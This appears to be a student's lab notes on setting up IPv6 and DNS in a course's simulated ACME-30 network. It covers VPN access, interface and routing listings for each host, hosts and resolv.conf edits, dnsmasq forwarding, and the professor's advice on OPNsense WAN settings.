# Assignment no.1 (v.1.0): **IPv6 security**

# _First steps_
I decided to work inside the VM we use for labs. It's easier to setup than my computer macOS.  
I started downloading the packages we need:
```bash
sudo apt update
sudo apt install openvpn
```

I also downloaded two files linked in the mail the prof sent me:
- `pulcini.2046542.ovpn` (file which contains all VPN parameters)
- `cr-ca.crt` (file which contains the CA public key, used to verify that the server you are connecting to is authentic)


Once done, we can run
```bash
sudo openvpn --config pulcini.2046542.ovpn
```
which starts a VPN connection using the specified configuration.

The command creates a virtual interface, now we can access to the lab admin panel opening https://100.64.0.2:8006/, with the credential the prof gave me.


# _Proxmox_
Now, we are inside Proxmox, a VM and container management tool, with console, virtual network and storage.
Once inside, I selected `Pool view` on the drop-down menu in the top left. This showed me the item `ACME-30` and all the devices inside him.

I took a tour of the web platform, doing some tests and orienting myself.

In the left side I clicked on one device (e.g. `main-firewall.acme-30.test`), and in the right side I selected `Console`, here I could see the command line interface or the desktop of the device, depending on the host OS.

I started analize IPv4 addresses of all devices.

# _Network_
```bash
----------------------------------------
|      MAIN FIREWALL - ROUTER          |
---------------------------------------- 
MAIN_FW_INTERFACES:
   - eth0: INTERNET .253.0/24
   - eth1: DMZ .6.0/24
   - eth2: EXT_SERVICES .4.0/24
   - eth3: LINK_INTERNAL .254.0/30

----------------------------------------
|            INTERNET / VPN            |
---------------------------------------- 
INTERNET:
   - network: .253.0/24

VPN:
   - endpoint: MAIN_FIREWALL
   - clients: ROAD_WARRIORS

----------------------------------------
|              DMZ NETWORK             |
----------------------------------------  
DMZ_NETWORK:
   - subnet: .6.0/24
   - connected_to: MAIN_FIREWALL

DMZ_HOSTS:
   - WEB_SERVER: .2
   - PROXY_SERVER: .3

----------------------------------------
|       EXTERNAL SERVICES NETWORK      |
---------------------------------------- 
EXT_SERVICES_NETWORK: 
   - subnet: .4.0/24
   - connected_to: MAIN_FIREWALL

EXT_SERVICES_HOSTS:
   - CLIENT_EXT_1: .X
   - FANTASTICCOFFEE: .10 

----------------------------------------
|        LINK BETWEEN FIREWALLS        |
----------------------------------------   
FW_LINK:
   - subnet: .254.0/30

----------------------------------------
|     INTERNAL FIREWALL - ROUTER       |
---------------------------------------- 
INTERNAL_FW_INTERFACES:
   - eth0: LINK_MAIN .254.0/30
   - eth1: SERVERS_NET .1.0/24
   - eth2: CLIENTS_NET .2.0/24

----------------------------------------
|      INTERNAL SERVERS NETWORK        |
----------------------------------------   
SERVERS_NETWORK:
   - subnet: .1.0/24
   - connected_to: INTERNAL_FIREWALL

SERVERS: 
   - DOMAIN_CONTROLLER: .2
   - LOG_SERVER: .3
   - GREENBONE: .4
   - GRAYLOG: .10

----------------------------------------
|           CLIENTS NETWORK            |
---------------------------------------- 
CLIENTS_NETWORK:
   - subnet: .2.0/24
   - connected_to: INTERNAL_FIREWALL

CLIENTS:
   - PC: .100
   - ARPWATCH: .254 

----------------------------------------
|        NETWORK FLOW (LOGICAL)        |
----------------------------------------   
FLOW:
   - INTERNET -> MAIN_FIREWALL
   - MAIN_FIREWALL -> DMZ
   - MAIN_FIREWALL -> EXT_SERVICES 
   - MAIN_FIREWALL -> INTERNAL_FIREWALL 
   - INTERNAL_FIREWALL -> SERVERS 
   - INTERNAL_FIREWALL -> CLIENTS

----------------------------------------
|            SECURITY ZONES            |
----------------------------------------  
ZONES: 
   - INTERNET
   - DMZ 
   - EXT_SERVICES 
   - INTERNAL_SERVERS 
   - CLIENTS
```

# _Devices_
Here there is what I found in a first scanning of every device.

## Arpwatch Clients (601) (arpwatch-clients.acme-30.test)
```bash
root@arpwatch-clients:~# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if4394: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1400 qdisc noqueue state UP group default qlen 1000
    link/ether ba:9d:d3:ec:ea:07 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 100.100.2.250/24 brd 100.100.2.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 2001:470:b5b8:1e82:b89d:d3ff:feec:ea07/64 scope global dynamic mngtmpaddr 
       valid_lft 86208sec preferred_lft 14208sec
    inet6 fe80::b89d:d3ff:feec:ea07/64 scope link 
       valid_lft forever preferred_lft forever

root@arpwatch-clients:~# ip -6 route
::1 dev lo proto kernel metric 256 pref medium
2001:470:b5b8:1e82::/64 dev eth0 proto kernel metric 256 expires 86143sec pref medium
fe80::/64 dev eth0 proto kernel metric 256 pref medium
default via fe80::64a3:2eff:fe83:1e7f dev eth0 proto ra metric 1024 expires 1543sec hoplimit 64 pref medium

root@arpwatch-clients:~# ip route
default via 100.100.2.1 dev eth0 onlink 
100.100.2.0/24 dev eth0 proto kernel scope link src 100.100.2.250 
```

## DNS Server (602) (dnsserver.acme-30.test)
```bash
root@dnsserver:~# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if6121: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1400 qdisc noqueue state UP group default qlen 1000
    link/ether ee:6c:35:c7:77:6f brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 100.100.1.2/24 brd 100.100.1.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 2001:470:b5b8:1e81:4730:4341:85e8:4a85/64 scope global dynamic mngtmpaddr stable-privacy 
       valid_lft 85932sec preferred_lft 13932sec
    inet6 fe80::a902:ceba:e3fe:69c9/64 scope link stable-privacy 
       valid_lft forever preferred_lft forever

root@dnsserver:~# ip -6 route
::1 dev lo proto kernel metric 256 pref medium
2001:470:b5b8:1e81::/64 dev eth0 proto kernel metric 256 expires 85927sec pref medium
fe80::/64 dev eth0 proto kernel metric 256 pref medium
default via fe80::e4f5:18ff:fe8b:b3e5 dev eth0 proto ra metric 1024 expires 1327sec hoplimit 64 pref medium

root@dnsserver:~# ip route
default via 100.100.1.1 dev eth0 onlink 
100.100.1.0/24 dev eth0 proto kernel scope link src 100.100.1.2 
```

## Log Server (604) (logserver.acme-30.test):
```bash
root@logserver:~# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if4402: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1400 qdisc noqueue state UP group default qlen 1000
    link/ether 16:cd:d6:00:4e:4c brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 100.100.1.3/24 brd 100.100.1.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 2001:470:b5b8:1e81:14cd:d6ff:fe00:4e4c/64 scope global dynamic mngtmpaddr 
       valid_lft 85871sec preferred_lft 13871sec
    inet6 fe80::14cd:d6ff:fe00:4e4c/64 scope link 
       valid_lft forever preferred_lft forever

root@logserver:~# ip -6 route
::1 dev lo proto kernel metric 256 pref medium
2001:470:b5b8:1e81::/64 dev eth0 proto kernel metric 256 expires 85866sec pref medium
fe80::/64 dev eth0 proto kernel metric 256 pref medium
default via fe80::e4f5:18ff:fe8b:b3e5 dev eth0 proto ra metric 1024 expires 1266sec hoplimit 64 pref medium

root@logserver:~# ip route
default via 100.100.1.1 dev eth0 onlink 
100.100.1.0/24 dev eth0 proto kernel scope link src 100.100.1.3
```

## Monitor Server (608) (monitorserver.acme-30.test):
```bash
root@monitorserver:~# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if4403: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1400 qdisc noqueue state UP group default qlen 1000
    link/ether 7e:8b:8b:15:85:7e brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 100.100.6.254/24 brd 100.100.6.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 2001:470:b5b8:1e06:7c8b:8bff:fe15:857e/64 scope global dynamic mngtmpaddr 
       valid_lft 86027sec preferred_lft 14027sec
    inet6 fe80::7c8b:8bff:fe15:857e/64 scope link 
       valid_lft forever preferred_lft forever
3: eth1@if4404: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 6a:7d:cd:38:29:cd brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 100.100.1.254/24 brd 100.100.1.255 scope global eth1
       valid_lft forever preferred_lft forever
    inet6 2001:470:b5b8:1e81:687d:cdff:fe38:29cd/64 scope global dynamic mngtmpaddr 
       valid_lft 86377sec preferred_lft 14377sec
    inet6 fe80::687d:cdff:fe38:29cd/64 scope link 
       valid_lft forever preferred_lft forever
4: eth2@if4412: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 06:55:36:a8:26:42 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 100.100.2.254/24 brd 100.100.2.255 scope global eth2
       valid_lft forever preferred_lft forever
    inet6 2001:470:b5b8:1e82:455:36ff:fea8:2642/64 scope global dynamic mngtmpaddr 
       valid_lft 86254sec preferred_lft 14254sec
    inet6 fe80::455:36ff:fea8:2642/64 scope link 
       valid_lft forever preferred_lft forever
5: eth3@if4418: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 0a:46:4e:b8:bb:80 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 100.100.4.254/24 brd 100.100.4.255 scope global eth3
       valid_lft forever preferred_lft forever
    inet6 2001:470:b5b8:1e04:846:4eff:feb8:bb80/64 scope global dynamic mngtmpaddr 
       valid_lft 86252sec preferred_lft 14252sec
    inet6 fe80::846:4eff:feb8:bb80/64 scope link 
       valid_lft forever preferred_lft forever
6: eth4@if4426: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether b6:59:e3:e0:42:1a brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 100.100.10.30/24 brd 100.100.10.255 scope global eth4
       valid_lft forever preferred_lft forever
    inet6 fe80::b459:e3ff:fee0:421a/64 scope link dadfailed tentative 
       valid_lft forever preferred_lft forever

root@monitorserver:~# ip -6 route
::1 dev lo proto kernel metric 256 pref medium
2001:470:b5b8:1e04::/64 dev eth3 proto kernel metric 256 expires 86245sec pref medium
2001:470:b5b8:1e06::/64 dev eth0 proto kernel metric 256 expires 86020sec pref medium
2001:470:b5b8:1e81::/64 dev eth1 proto kernel metric 256 expires 86370sec pref medium
2001:470:b5b8:1e82::/64 dev eth2 proto kernel metric 256 expires 86247sec pref medium
fe80::/64 dev eth0 proto kernel metric 256 pref medium
fe80::/64 dev eth1 proto kernel metric 256 pref medium
fe80::/64 dev eth2 proto kernel metric 256 pref medium
fe80::/64 dev eth3 proto kernel metric 256 pref medium
fe80::/64 dev eth4 proto kernel metric 256 pref medium
default via fe80::d42d:f4ff:fe06:e2d9 dev eth3 proto ra metric 1024 expires 1645sec hoplimit 64 pref medium
default via fe80::44fd:65ff:fe1b:8895 dev eth0 proto ra metric 1024 expires 1420sec hoplimit 64 pref medium
default via fe80::e4f5:18ff:fe8b:b3e5 dev eth1 proto ra metric 1024 expires 1770sec hoplimit 64 pref medium
default via fe80::64a3:2eff:fe83:1e7f dev eth2 proto ra metric 1024 expires 1647sec mtu 1400 hoplimit 64 pref medium

root@monitorserver:~# ip route
default via 100.100.1.1 dev eth0 
100.100.1.0/24 dev eth1 proto kernel scope link src 100.100.1.254 
100.100.1.1 dev eth0 scope link 
100.100.2.0/24 dev eth2 proto kernel scope link src 100.100.2.254 
100.100.4.0/24 dev eth3 proto kernel scope link src 100.100.4.254 
100.100.6.0/24 dev eth0 proto kernel scope link src 100.100.6.254 
100.100.10.0/24 dev eth4 proto kernel scope link src 100.100.10.30
```

## Greenbone (609) (greenbone.acme-30.test)
???

## Web Server (611) (webserver.acme-30.test)
```bash
root@webserver:~# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if6178: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1400 qdisc noqueue state UP group default qlen 1000
    link/ether 42:fa:57:4a:20:73 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 100.100.6.2/24 brd 100.100.6.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 2001:470:b5b8:1e06:40fa:57ff:fe4a:2073/64 scope global dynamic mngtmpaddr 
       valid_lft 86391sec preferred_lft 14391sec
    inet6 fe80::40fa:57ff:fe4a:2073/64 scope link 
       valid_lft forever preferred_lft forever

root@webserver:~# ip -6 route
::1 dev lo proto kernel metric 256 pref medium
2001:470:b5b8:1e06::/64 dev eth0 proto kernel metric 256 expires 86383sec pref medium
fe80::/64 dev eth0 proto kernel metric 256 pref medium
default via fe80::44fd:65ff:fe1b:8895 dev eth0 proto ra metric 1024 expires 1783sec hoplimit 64 pref medium

root@webserver:~# ip route
default via 100.100.6.1 dev eth0 onlink 
100.100.6.0/24 dev eth0 proto kernel scope link src 100.100.6.2
```

## Proxy Server (612) (proxyserver.acme-30.test)
```bash
root@proxyserver:~# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if4417: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1400 qdisc noqueue state UP group default qlen 1000
    link/ether 76:da:b5:d2:95:2a brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 100.100.6.3/24 brd 100.100.6.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 2001:470:b5b8:1e06:74da:b5ff:fed2:952a/64 scope global dynamic mngtmpaddr 
       valid_lft 86304sec preferred_lft 14304sec
    inet6 fe80::74da:b5ff:fed2:952a/64 scope link 
       valid_lft forever preferred_lft forever

root@proxyserver:~# ip -6 route
::1 dev lo proto kernel metric 256 pref medium
2001:470:b5b8:1e06::/64 dev eth0 proto kernel metric 256 expires 86297sec pref medium
fe80::/64 dev eth0 proto kernel metric 256 pref medium
default via fe80::44fd:65ff:fe1b:8895 dev eth0 proto ra metric 1024 expires 1697sec hoplimit 64 pref medium

root@proxyserver:~# ip route
default via 100.100.6.1 dev eth0 onlink 
100.100.6.0/24 dev eth0 proto kernel scope link src 100.100.6.3
```

## Fantastic Coffee (614) (fantastic-coffee.acme-30.test) 
???

## Graylog (615) (graylog.acme-30.test) 
```bash
root@graylog:~# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if4431: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1400 qdisc noqueue state UP group default qlen 1000
    link/ether 02:8c:10:8c:c9:54 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 100.100.1.10/24 brd 100.100.1.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 2001:470:b5b8:1e81:8c:10ff:fe8c:c954/64 scope global dynamic mngtmpaddr 
       valid_lft 86378sec preferred_lft 14378sec
    inet6 fe80::8c:10ff:fe8c:c954/64 scope link 
       valid_lft forever preferred_lft forever

root@graylog:~# ip -6 route
::1 dev lo proto kernel metric 256 pref medium
2001:470:b5b8:1e81::/64 dev eth0 proto kernel metric 256 expires 86371sec pref medium
fe80::/64 dev eth0 proto kernel metric 256 pref medium
default via fe80::e4f5:18ff:fe8b:b3e5 dev eth0 proto ra metric 1024 expires 1771sec hoplimit 64 pref medium

root@graylog:~# ip route   
default via 100.100.1.1 dev eth0 onlink 
100.100.1.0/24 dev eth0 proto kernel scope link src 100.100.1.10
```

## Main Firewall-Router (598) (main-firewall.acme-30.test)
```bash
em0: flags=8863<UP, BROADCAST, RUNNING, SIMPLEX, MULTICAST> metric 0 mtu 1400
   description: WAN (wan)
   options=48520b8<VLAN_MTU, VLAN_HNTAGGING,JUMBO_MTU, VLAN_HHCSUM,HOL_MAGIC,
VLAN_HWF ILTER, VLAN_ _HWTSO, HOMAP>
   ether 76:61:8c:b4:d1:12
   inet6 fe80::7461:8cff:feb4:d112%em0 prefixlen 64 scopeid 0x1
   inet6 fd00::7461:8cff:feb4:d112 prefixlen 64 autoconf
   inet6 fd00::c7:aa95:b140:4186 prefixlen 128
   inet 100.100.0.2 netmask 0xffffff00 broadcast 100.100.0.255
   media: Ethernet autoselect (1000baseT <full-duplex>)
   status: active
   nd6 options=23<PERFORMNUD, ACCEPT_RTADV, AUTO_LINKLOCAL>

em1: flags=8863<UP, BROADCAST, RUNNING, SIMPLEX, MULTICAST> metric 0 mtu 1400
   description: DMZ (lan)
   options=48528b8<VLAN_MTU, VLAN_HWTAGGING, JUMBO_MTU, VLAN_HNCSUM,HOL_MAGIC,
VLAN_HWFILTER, VLAN_HHTSO, HOMAP >
   ether 46:fd:65:1b:88:95
   inet6 fe80::44fd:65ff:felb:8895%em1 prefixlen 64 scopeid 0x2
   inet6 2001:470:b5b8:1e06:44fd:65ff:fe1b:8895 prefixlen 64
   inet 100.100.6.1 netmask 0xffffff00 broadcast 100.100.6.255
   media: Ethernet autoselect (1000baseT <full-duplex>)
   status: active
   nd6 options=21<PERFORMNUD, AUTO_LINKLOCAL>

em2: flags=8863<UP, BROADCAST, RUNNING, SIMPLEX, MULTICAST> metric 0 mtu 1400
   description: INTERNAL (opt2)
   options=48520b8<VLAN_MTU,VLAN_HHTAGGING,JUMBO_MTU,VLAN_HHCSUM,HOL_MAGIC,
VLAN_HWFILTER, VLAN_HWTSO, NOMAP>
   ether d2:cb:c3:2b:36:7e
   inet6 fe80::d0cb:c3ff:fe2b:367e%em2 prefixlen 64 scopeid 0x3
   inet6 2001:470:b5b8:1e0f:d0cb:c3ff:fe2b:367e prefixlen 64
   inet 100.100.254.1 netmask Oxfffffffc broadcast 100.100.254.3
   media: Ethernet autoselect (1000baseT <full-duplex>)
   status: active
   nd6 options=21<PERFORMNUD, AUTO_LINKLOCAL>

em3: flags=8863<UP, BROADCAST, RUNNING, SIMPLEX, MULTICAST> metric 0 mtu 1400
   description: EXTERNAL_CLIENTS (opt1)
   options=48520b8<VLAN_MTU, VLAN_HWTAGGING,JUMBO_MTU, VLAN_HUCSUM,HOL_MAGIC,
VLAN_HWFILTER, VLAN_HWTSO, NOMAP>
   ether d6:2d:f4:06:e2:d9
   inet6 fe80::d42d:f4ff:fe06:e2d9%em3 prefixlen 64 scopeid 0x4
   inet6 2001:470:b5b8:1e04:d42d:f4ff:fe06:e2d9 prefixlen 64
   inet 100.100.4.1 netmask 0xffffff00 broadcast 100.100.4.255
   media: Ethernet autoselect (1000baseT <full-duplex>)
   status: active
   nd6 options=21<PERFORMNUD, AUTO_LINKLOCAL>

lo0: flags=8049<UP,LOOPBACK, RUNNING, MULTICAST> metric 0 mtu 16384
   options=680003<RXCSUM, TXCSUM, LINKSTATE, RCSUM_IPV6, TXCSUM_ IPV6>
   inet6 ::1 prefixlen 128
   inet6 fe80::1%lo0 prefixlen 64 scopeid 0x5
   inet 127.0.0.1 netmask 0xff000000
   groups: lo
   nd6 options=21<PERFORMNUD, AUTO_LINKLOCAL>

enc0: flags=0<> metric 0 mtu 1536
   groups: enc
   nd6 options=23<PERFORMNUD, ACCEPT_RTADV, AUTO_LINKLOCAL>

pflog0: flags=20100<PROMISC,PPROMISC> metric 0 mtu 33160
   groups: pflog

pfsync0: flags=0<> metric 0 mtu 1500
   syncpeer: 0.0.0.0 maxupd: 128 defer: off
   syncok: 1
   groups: pfsync
```

## Internal Firewall-Router (599) (internal-firewall.acme-30.test)
???

## Kali (600) (kali.acme-30.test) 
```bash
┌──(user㉿pc1)-[~]
└─$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1400 qdisc fq_codel state UP group default qlen 1000
    link/ether e6:80:50:76:15:46 brd ff:ff:ff:ff:ff:ff
    inet 100.100.2.100/24 brd 100.100.2.255 scope global dynamic noprefixroute eth0
       valid_lft 3769sec preferred_lft 3769sec
    inet6 2001:470:b5b8:1e82::2000/128 scope global dynamic noprefixroute 
       valid_lft 7072sec preferred_lft 4372sec
    inet6 2001:470:b5b8:1e82:8838:6c08:65b8:5dac/64 scope global temporary dynamic 
       valid_lft 86165sec preferred_lft 14165sec
    inet6 2001:470:b5b8:1e82:7ab2:ec67:312:97d9/64 scope global dynamic mngtmpaddr noprefixroute 
       valid_lft 86165sec preferred_lft 14165sec
    inet6 fe80::476a:a47b:68a:a64d/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
                                                                                                                            
┌──(user㉿pc1)-[~]
└─$ ip -6 route
2001:470:b5b8:1e82::2000 dev eth0 proto kernel metric 100 pref medium
2001:470:b5b8:1e82::/64 dev eth0 proto ra metric 100 pref medium
fe80::/64 dev eth0 proto kernel metric 1024 pref medium
default via fe80::64a3:2eff:fe83:1e7f dev eth0 proto ra metric 100 pref medium
                                                                                                                            
┌──(user㉿pc1)-[~]
└─$ ip route   
default via 100.100.2.1 dev eth0 proto dhcp src 100.100.2.100 metric 100 
100.100.2.0/24 dev eth0 proto kernel scope link src 100.100.2.100 metric 100
```

## Client ext 1 (613) (client-ext-1.acme-30.test) 
```bash
┌──(user㉿pc1)-[~]
└─$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1400 qdisc fq_codel state UP group default qlen 1000
    link/ether e6:80:50:76:15:46 brd ff:ff:ff:ff:ff:ff
    inet 100.100.4.100/24 brd 100.100.4.255 scope global dynamic noprefixroute eth0
       valid_lft 6205sec preferred_lft 6205sec
    inet6 2001:470:b5b8:1e04::2000/128 scope global dynamic noprefixroute 
       valid_lft 5425sec preferred_lft 2725sec
    inet6 2001:470:b5b8:1e04:4e96:93f8:b8a9:ae31/64 scope global temporary dynamic 
       valid_lft 86371sec preferred_lft 14371sec
    inet6 2001:470:b5b8:1e04:c757:cde4:3799:1c95/64 scope global dynamic mngtmpaddr noprefixroute 
       valid_lft 86371sec preferred_lft 14371sec
    inet6 fe80::476a:a47b:68a:a64d/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
                                                                                                                           
┌──(user㉿pc1)-[~]
└─$ ip -6 route
2001:470:b5b8:1e04::2000 dev eth0 proto kernel metric 100 pref medium
2001:470:b5b8:1e04::/64 dev eth0 proto ra metric 100 pref medium
fe80::/64 dev eth0 proto kernel metric 1024 pref medium
default via fe80::d42d:f4ff:fe06:e2d9 dev eth0 proto ra metric 100 pref medium
                                                                                                                           
┌──(user㉿pc1)-[~]
└─$ ip route   
default via 100.100.4.1 dev eth0 proto dhcp src 100.100.4.100 metric 100 
100.100.4.0/24 dev eth0 proto kernel scope link src 100.100.4.100 metric 100 
```


# _IPv6 Configuration_
I didn't configure IPv6 for all devices, because they were already configured, following the guide at [IPv6_Configuration.md](IPv6_Configuration.md).



# _DNS Configuration_
First, we modify the `/etc/hosts` file as follows:
```bash
127.0.0.1       localhost
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
# --- BEGIN PVE ---
100.100.1.2 dnsserver.acme-30.test dnsserver
# --- END PVE ---

# Servers
2001:470:b5b8:1e81:4730:4341:85e8:4a85 dnsserver.acme-30.test dnsserver

100.100.6.2 webserver.acme-30.test webserver
2001:470:b5b8:1e06:40fa:57ff:fe4a:2073 webserver.acme-30.test webserver

100.100.6.3 proxyserver.acme-30.test proxyserver
2001:470:b5b8:1e06:74da:b5ff:fed2:952a proxyserver.acme-30.test proxyserver

100.100.1.10 graylog.acme-30.test graylog
2001:470:b5b8:1e81:8c:10ff:fe8c:c954 graylog.acme-30.test graylog

100.100.1.3 logserver.acme-30.test logserver
2001:470:b5b8:1e81:14cd:d6ff:fe00:4e4c logserver.acme-30.test logserver

100.100.1.254 monitorserver.acme-30.test monitorserver
2001:470:b5b8:1e81:687d:cdff:fe38:29cd monitorserver.acme-30.test monitorserver   


# Clients
100.100.2.100 kali.acme-30.test kali
2001:470:b5b8:1e82:7ab2:ec67:312:97d9 kali.acme-30.test kali

100.100.2.250 arpwatch-clients.acme-30.test arpwatch-clients
2001:470:b5b8:1e82:b89d:d3ff:feec:ea07 arpwatch-clients.acme-30.test arpwatch-clients


# External clients
100.100.4.100 client-ext-1.acme-30.test client-ext-1
2001:470:b5b8:1e04:c757:cde4:3799:1c95 client-ext-1.acme-30.test client-ext-1
```

We then create the file `touch /etc/.pve-ignore.resolv.conf`, which is used to prevent `/etc/resolv.conf` from being overwritten.

After that, we modify the `/etc/resolv.conf` file.

From:
```bash
   # --- BEGIN PVE ---
   search acme.corp
   nameserver 151.100.4.13
   # --- END PVE ---
```
To:
```bash
   # --- BEGIN PVE ---
   nameserver 127.0.0.1
   search acme-30.test
   # --- END PVE ---
```

We then performed the following tests, and all of them work:
- `dig AAAA webserver @127.0.0.1`
- `dig webserver.acme-30.test @127.0.0.1`
- `dig webserver @127.0.0.1`
- `dig webserver`
- `ping webserver`
- `ping arpwatch-clients`


# _Clients configuration_

- We modify `/etc/resolv.conf` on each host.

We start from kali for testing:
(if it works, we replicate it on all hosts)

First, we protect the file with `touch /etc/.pve-ignore.resolv.conf`.  
This must be done before making changes, otherwise everything will be lost at reboot.

Then we edit `nano /etc/resolv.conf`, inserting exactly:
```bash
nameserver 100.100.1.2
nameserver 2001:470:b5b8:1e81:4730:4341:85e8:4a85
search acme-30.test
```

We run some tests, and all of them work:
- `dig webserver`
- `ping webserver`
- `ping webserver.acme-30.test`


# _Configured hosts_
- kali
- client-ext-1
- graylog
- proxyserver
- webserver
- arpwatch-clients (`dig` non installato)
- logserver (`dig` non installato)
- monitorserver (`dig` non installato)


# _Professor's suggestions_
---
"To make the connection from your openvpn client to the GUI of opnsense (and if you allow it to any host in the ACME network), in addition to explicitly allowing the incoming traffic from WAN from the IP of your clients, you also have to disable the following options in the Interfaces[WAN] menu:
1. untick Block private networks
2. untick Block bogon networks

The above changes will remove one of the "Automatically generated rules" that, by default, does not accept private addresses from the Internet."

---

We access from `client-ext-1` to `100.100.4.1`.  
In Interface -> `[WAN]` we disabled "Block private networks" → `UNCHECK` and "Block bogon networks" → `UNCHECK`.

`Block private networks` blocks incoming traffic from private networks such as:
- `10.0.0.0/8`
- `172.16.0.0/12`
- `192.168.0.0/16`  

It is used to prevent spoofing from the WAN (fake private Internet traffic).

`Block bogon networks` blocks “unassigned Internet networks”, such as:
- publicly non-routable addresses
- invalid or unallocated IPv4/IPv6 ranges

It is used as an anti-spoofing protection.

In our case, they must be disabled because:
- the `WAN` is not the real Internet
- it is the lab network (OpenVPN / ACME network)
- we intentionally use private IPs, so OPNsense considers them “malicious” even if they are not



---
"To test the internal connectivity towards the internet, recall that only pings are allowed, and a limited set of domain names can be reached using HTTP and HTTPS. The list is in the file attached below."

---

The professor doesn't want to block DNS.

However, DNS must work (otherwise you cannot filter by domain), while HTTP/HTTPS must be filtered.

Our current state isn't correct, because:
- DNS returns `REFUSED` → too restrictive
- we cannot resolve names → no web → no testing

The correct setup should be:

1. DNS (`dnsmasq`)
   - resolves `acme-30.test` locally
   - forwards requests to the Internet (Google, GitHub, etc.)

2. Firewall
   - blocks HTTP/HTTPS to non-allowed domains
   - allows HTTP/HTTPS to github, debian, kali, etc.

Therefore, filtering must not be done in DNS, but in the firewall.
- DNS = name resolution
- Firewall = traffic control

We proceed by fixing DNS.  
We open `nano /etc/dnsmasq.conf` and add:
```bash
no-resolv
server=8.8.8.8
server=1.1.1.1
```
Leaving everything else unchanged.  
We restart with `systemctl restart dnsmasq`.

Now `dig google.com` and `dig github.com` work.

We move to the client side (`client-ext-1` in this case).  
